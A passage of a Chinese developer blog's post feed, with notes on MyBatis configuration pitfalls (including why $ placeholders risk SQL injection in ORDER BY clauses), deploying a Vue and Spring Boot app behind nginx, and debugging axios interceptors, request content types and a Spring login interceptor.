class="line">system.out.println(users);</span><br></pre></td></tr></table></figure><p>可以看到控制台显示mybatis查询成功，有打印出SQL语句和查询结果，但是users这个集合是null。</p><p>于是我猜测是没有成功将查询结果封装进对象里，但是我已经配置好了自动转换驼峰命名。</p><p><strong>解决：</strong></p><p>经过百度，发现可能是因为项目配置了多数据源，mybatis不知道配置哪个数据源，而自定义的sqlSessionFactory默认不会加载mybatis配置。</p><p>所以我们需要手动将mybatis配置注册到sqlSessionFactory中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;mybatis.configuration&quot;)</span></span><br><span class="line"><span class="keyword">public</span> org.apache.ibatis.session.Configuration <span class="title function_">globalConfiguration</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">org</span>.apache.ibatis.session.Configuration();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean(name = &quot;igmSqlSessionFactory&quot;)</span></span><br><span class="line"><span class="keyword">public</span> SqlSessionFactory <span class="title function_">igmSqlSessionFactory</span><span class="params">(<span class="meta">@Qualifier(&quot;igmDataSource&quot;)</span> DataSource igmDataSource,org.apache.ibatis.session.Configuration configuration)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">SqlSessionFactoryBean</span> <span class="variable">sessionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBean</span>();</span><br><span class="line">    sessionFactory.setDataSource(igmDataSource);</span><br><span class="line">    sessionFactory.setConfiguration(configuration);</span><br><span class="line">    <span class="keyword">return</span> sessionFactory.getObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是官网关于MyBatis-Spring-Boot-Starte的一段翻译：</p><blockquote><p>MyBatis-Spring-Boot-Starter将：</p><ul><li>自动检测现有的 <code>DataSource</code></li><li>将<code>DataSource</code>作为输入使用并通过<code>SqlSessionFactoryBean</code>创建和注册一个<code>SqlSessionFactory</code>实例</li><li>将创建并注册一个从<code>SqlSessionFactory</code>中获取的<code>SqlSessionTemplate</code>实例</li><li>自动扫描您的映射器，将它们链接到<code>SqlSessionTemplate</code>并将它们注册到Spring上下文中，以便可以将它们注入到您的bean中</li></ul></blockquote><h1 id="控制台不打印SQL语句及参数问题"><a href="#控制台不打印SQL语句及参数问题" class="headerlink" title="控制台不打印SQL语句及参数问题"></a>控制台不打印SQL语句及参数问题</h1><p>application.yml中配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="attr">top.nanzx.dao:</span> <span class="string">debug</span></span><br></pre></td></tr></table></figure><h1 id="非法参数异常：-argument-type-mismatch"><a href="#非法参数异常：-argument-type-mismatch" class="headerlink" title="非法参数异常： argument type mismatch"></a>非法参数异常： argument type mismatch</h1><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20210127232544.png"></p><p>我的Dao层：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;ShowCourse&gt; <span class="title function_">showCourse</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><p>ShowCourse（使用了Lombok插件）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShowCourse</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Course course;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String type;<span class="comment">//推荐、热门、最新</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决：多加一个@NoArgsConstructor</p><h1 id="基于注解的多表查询"><a href="#基于注解的多表查询" class="headerlink" title="基于注解的多表查询"></a>基于注解的多表查询</h1><p><a href="https://blog.csdn.net/qq_40348465/article/details/84718602?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.not_use_machine_learn_pai&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.not_use_machine_learn_pai">CSDN MyBatis学习总结（十）—基于注解的多表查询（一对一，一对多，多对多）</a></p><h1 id="order-by注入问题"><a href="#order-by注入问题" class="headerlink" title="order by注入问题"></a>order by注入问题</h1><p>原Dao语句如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Select(&quot;SELECT * FROM note WHERE no = #&#123;no&#125; ORDER BY #&#123;prop&#125; #&#123;order&#125;&quot;)</span></span><br><span class="line">List&lt;Note&gt; <span class="title function_">getNotes</span><span class="params">(<span class="meta">@Param(&quot;no&quot;)</span>String no, <span class="meta">@Param(&quot;prop&quot;)</span>String prop, <span class="meta">@Param(&quot;order&quot;)</span>String order)</span>;</span><br></pre></td></tr></table></figure><p>这时调用sql语句会报如下异常：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.druid.sql.parser.ParserException: syntax error, error in :<span class="string">&#x27;RDER BY ? ?</span></span><br><span class="line"><span class="string"> ) tmp_count&#x27;</span>, expect RPAREN, actual QUES pos <span class="number">68</span>, line <span class="number">2</span>, column <span class="number">44</span>, token QUES</span><br></pre></td></tr></table></figure><p>查了一下才知道：</p><p><strong>（1）使用#运算符，Mybatis会将传入的对象当成一个字符串，在进行变量替换时会加上引号，所以order by语句，替换后就变成了下面的样子</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> note <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="string">&#x27;no&#x27;</span> <span class="string">&#x27;desc&#x27;</span>;</span><br></pre></td></tr></table></figure><p>虽然不会报错，但也<strong>不能正确排序</strong>。</p><p><strong>（2）使用$运算符，Mybatis不会进行预编译，直接把值传进去，无法防止sql注入，当我们需要传字段的名称时，可以考虑使用$符号，但在后台需要进行数据校验，才能在一定程度上防止sql注入。</strong></p><h1 id="Insert返回主键"><a href="#Insert返回主键" class="headerlink" title="@Insert返回主键"></a>@Insert返回主键</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Insert(&quot;INSERT INTO course(course_name,img_url,teacher_no,create_time,intro,notice) &quot; +</span></span><br><span class="line"><span class="meta">        &quot;VALUES (#&#123;course.courseName&#125;,#&#123;course.imgUrl&#125;,#&#123;course.teacher.no&#125;,#&#123;course.date&#125;,&quot; +</span></span><br><span class="line"><span class="meta">        &quot;#&#123;course.intro&#125;,#&#123;course.notice&#125;)&quot;)</span></span><br><span class="line"><span class="meta">@Options(useGeneratedKeys=true, keyProperty=&quot;course.id&quot;, keyColumn=&quot;id&quot;)</span></span><br><span class="line">Integer <span class="title function_">createCourse</span><span class="params">(<span class="meta">@Param(&quot;course&quot;)</span> Course course)</span>;</span><br></pre></td></tr></table></figure><p>配置<code>@Options(useGeneratedKeys=true, keyProperty=&quot;对象.属性&quot;,keyColumn=&quot;数据库对应字段&quot;)</code> </p><p>这个的作用是设置是否使用 JDBC 的<code>getGenereatedKeys()</code>方法获取主键并赋值到keyProperty设置的对象的属性中。</p><p>在插入后，使用对象的主键属性的getXXId()方法获取主键值。</p>]]></content>
      
      
      <categories>
          
          <category> Mybatis </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>前后端分离项目的部署</title>
      <link href="/posts/5a18/"/>
      <url>/posts/5a18/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows环境部署"><a href="#Windows环境部署" class="headerlink" title="Windows环境部署"></a>Windows环境部署</h1><h2 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h2><ul><li><p><code>axios.defaults.baseURL = &quot;http://localhost:8080&quot;</code>，配置的是前端访问后端接口的服务。 </p></li><li><p>前端部署还需考虑一个问题：打包之后项目资源引用路径，比如我们打包后链接是否需要带项目名称等。按照Vue官方的部署说明，我们需要添加一个<strong>vue.config.js</strong>文件：<code>module.exports = &#123;  publicPath: &#39;/&#39; &#125;</code>。</p></li><li><p>执行打包命令：<code>npm run build</code>，把打包出来的dist文件夹内的所有文件（不包括dist文件夹）都复制到nginx的html文件夹中。</p></li><li><p>启动nginx，然后浏览器输入<code>http://localhost</code>，就可以访问到我们的vue项目，nginx默认端口是80。</p></li><li><p>我们点击任意刷新界面，这时候出现了404，这是因为刷新之后nginx就找不到路由了。</p><ul><li>vue项目的入口是index.html文件，nginx路由的时候都必须要先经过这个文件，所以我们得给nginx定义一下规则，让它匹配不到资源路径的时候，先去读取index.html，然后再路由。</li><li>所以我们配置一下nginx.conf文件。具体操作如下：</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    location / &#123;</span><br><span class="line">        root   html;</span><br><span class="line">        try_files $uri $uri/ /index.html last;</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">try_files的语法规则：按顺序检查文件是否存在，返回第一个找到的文件。结尾的斜线表示为文件夹 -$uri/。last表示如果所有的文件都找不到，会进行一个内部重定向到最后一个参数。</span><br></pre></td></tr></table></figure><p>重启nginx之后，页面再刷新就正常了。</p><hr><h2 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h2><ul><li><p>配置好数据库等链接和密码</p></li><li><p>执行打包命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 跳过测试打包</span><br><span class="line">mvn clean package -Dmaven.test.skip=true</span><br></pre></td></tr></table></figure></li><li><p>得到target下的vue-0.0.1-SNAPSHOT.jar，然后再执行命令：</p><p><code>java -jar vue-0.0.1-SNAPSHOT.jar</code></p></li><li><p>后端上线之后，我们再访问下前端，发现已经可以正常浏览网页了。</p></li></ul><h1 id="Linux环境部署"><a href="#Linux环境部署" class="headerlink" title="Linux环境部署"></a>Linux环境部署</h1><ol><li><p><a href="https://blog.csdn.net/qq_42815754/article/details/82980326">安装Nginx</a></p></li><li><p><a href="https://blog.csdn.net/gexiaoyizhimei/article/details/95374890">配置Java环境</a></p></li><li><p><a href="https://blog.csdn.net/beekimlin/article/details/104551278">防火墙开放所需端口</a>，像mysql的3306，nginx的80，后台服务的8080端口等；如果部署在云服务器上，还需在云服务器的管理页面中将端口加入安全组才可以访问。</p></li><li><p>在Linux上安装Mysql，导入所需数据表。</p></li><li><p>部署前端项目，与Windows大致相同。</p></li><li><p>后端项目也类似，将打包后的jar包上传至服务器的任意位置，再执行命令：<code>nohup java -jar vue-0.0.1-SNAPSHOT.jar &amp;</code>，这时后端服务就会在后台自动运行，且输入日志到当前目录下的一个文件中。</p></li></ol><p><strong>注意：vue项目中配置好axios的url；springboot中配置好远程主机和端口，密码等。</strong></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> JavaWeb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 部署 </tag>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>项目的总结</title>
      <link href="/posts/a7fd/"/>
      <url>/posts/a7fd/</url>
      
        <content type="html"><![CDATA[<h1 id="浏览器异常：TypeError"><a href="#浏览器异常：TypeError" class="headerlink" title="浏览器异常：TypeError"></a>浏览器异常：TypeError</h1><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>封装好的request.js：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">request</span>(<span class="params">config</span>) &#123;</span><br><span class="line">  <span class="comment">// 1.创建axios的实例</span></span><br><span class="line">  <span class="keyword">const</span> instance = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">    <span class="attr">baseURL</span>: <span class="string">&#x27;http://127.0.0.1:8181&#x27;</span>,</span><br><span class="line">    <span class="attr">timeout</span>: <span class="number">5000</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2.axios的拦截器</span></span><br><span class="line">  <span class="comment">// 2.1.请求拦截的作用</span></span><br><span class="line">  instance.<span class="property">interceptors</span>.<span class="property">request</span>.<span class="title function_">use</span>(<span class="function"><span class="params">config</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> config</span><br><span class="line">  &#125;, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2.2.响应拦截</span></span><br><span class="line">  instance.<span class="property">interceptors</span>.<span class="property">response</span>.<span class="title function_">use</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// console.log(res);</span></span><br><span class="line">    <span class="keyword">return</span> res.<span class="property">data</span></span><br><span class="line">  &#125;, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3.发送真正的网络请求</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">instance</span>(config)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>axios发送请求代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;request&#125; <span class="keyword">from</span> <span class="string">&quot;@/network/request&quot;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;Blogs&quot;</span>,</span><br><span class="line">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">currentPage</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">total</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="attr">size</span>: <span class="number">4</span>,</span><br><span class="line">      <span class="attr">pages</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="attr">blogs</span>: []</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">methods</span>: &#123;</span><br><span class="line">    <span class="title function_">getBlogs</span>(<span class="params">currentPage, size</span>) &#123;</span><br><span class="line">      <span class="title function_">request</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;/getBlogs?currentPage=&#x27;</span> + currentPage + <span class="string">&#x27;&amp;size=&#x27;</span> + size</span><br><span class="line">      &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span>&#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">total</span> = res.<span class="property">data</span>.<span class="property">data</span>.<span class="property">total</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">size</span> = res.<span class="property">data</span>.<span class="property">data</span>.<span class="property">size</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">pages</span> = res.<span class="property">data</span>.<span class="property">data</span>.<span class="property">pages</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">blogs</span> = res.<span class="property">data</span>.<span class="property">data</span>.<span class="property">records</span></span><br><span class="line">        <span class="comment">// console.log(this)</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201119091657.png"></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201122151055.png"></p><h2 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h2><ul><li><p>起初我以为是total这个属性读取不到，将this赋值给_this，在request里再使用 _this.total访问，还是报错；</p></li><li><p>于是去百度，看到别人报这个错是因为使用<code>Vue.use(axios)</code>，改为原型全局注册后就不报错了：<code>Vue.prototype.$http = axios</code></p></li><li><p>因为暂时想不出解决方法，所以我放弃使用封装的request.js，改用下面这种方法来使用axios：</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./store&#x27;</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$http</span> = axios</span><br><span class="line">axios.<span class="property">defaults</span>.<span class="property">baseURL</span> = <span class="string">&#x27;http://localhost:8181&#x27;</span></span><br><span class="line">axios.<span class="property">defaults</span>.<span class="property">withCredentials</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  router,</span><br><span class="line">  store,</span><br><span class="line">  <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>)</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$http</span>.<span class="title function_">get</span>(<span class="string">&#x27;http://localhost:8181/blogs&#x27;</span></span><br><span class="line">).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li><p>项目完成结束后，我回来重新测试这个问题，发现是我axios的拦截器响应拦截后给我返回的是<strong>只有数据部分</strong>：<code>return res.data</code>；所以要赋值的话应为：<code>this.total = res.data.total</code></p></li><li><p>所以在使用axios的拦截器时，应<strong>注意放行拦截结果</strong>：    <code>return config</code> 和 <code>    return res</code></p></li></ul><hr><h1 id="请求400"><a href="#请求400" class="headerlink" title="请求400"></a>请求400</h1><h2 id="问题描述-1"><a href="#问题描述-1" class="headerlink" title="问题描述"></a>问题描述</h2><p>后端：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201119152946.png"></p><p>前端：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">ruleForm</span>: &#123;</span><br><span class="line">      <span class="attr">username</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">      <span class="attr">password</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">  <span class="title function_">submitForm</span>(<span class="params">formName</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$refs</span>[formName].<span class="title function_">validate</span>(<span class="function">(<span class="params">valid</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (valid) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">$http</span>.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="variable language_">this</span>.<span class="property">ruleForm</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br></pre></td></tr></table></figure><p>登录页面提交表单后：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201119152121.png"></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201119153935.png"></p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201119154018.png"></p><p><strong>可以看到图中的Content-Type：application&#x2F;json</strong></p><ul><li><p>如果前端传入的是json数据（<strong>Content-Type：application&#x2F;json</strong>），那么后端使用<code>@RequestBody HashMap&lt;String, String&gt; map</code>或者<code>@RequestBody User user</code>进行接收。</p></li><li><p>如果前端传入的是简单类型数据（<strong>Content-Type：application&#x2F;x-www-form-urlencoded</strong>），那么后端可以使用<code>@RequestParam(&quot;id&quot;) String id</code>。</p></li></ul><p><a href="https://blog.csdn.net/qq_20957669/article/details/87686899">spring boot一些注解的详解</a></p><hr><h1 id="跨域与拦截器导致跨域失败"><a href="#跨域与拦截器导致跨域失败" class="headerlink" title="跨域与拦截器导致跨域失败"></a>跨域与拦截器导致跨域失败</h1><h2 id="拦截器和跨域的配置代码"><a href="#拦截器和跨域的配置代码" class="headerlink" title="拦截器和跨域的配置代码"></a>拦截器和跨域的配置代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.blog.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> top.nanzx.blog.entity.Admin;</span><br><span class="line"><span class="keyword">import</span> top.nanzx.blog.service.AdminService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdminLoginInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    AdminService adminService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Cookie[] cookies = request.getCookies();</span><br><span class="line">        <span class="type">Admin</span> <span class="variable">admin</span> <span class="operator">=</span> adminService.getOne(<span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;Admin&gt;().eq(<span class="string">&quot;id&quot;</span>, <span class="number">1</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> admin.getToken();</span><br><span class="line">        <span class="keyword">for</span> (Cookie c : cookies) &#123;</span><br><span class="line">            <span class="keyword">if</span> (c.getName().equals(<span class="string">&quot;token&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> token.equals(c.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.blog.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.CorsRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Config</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    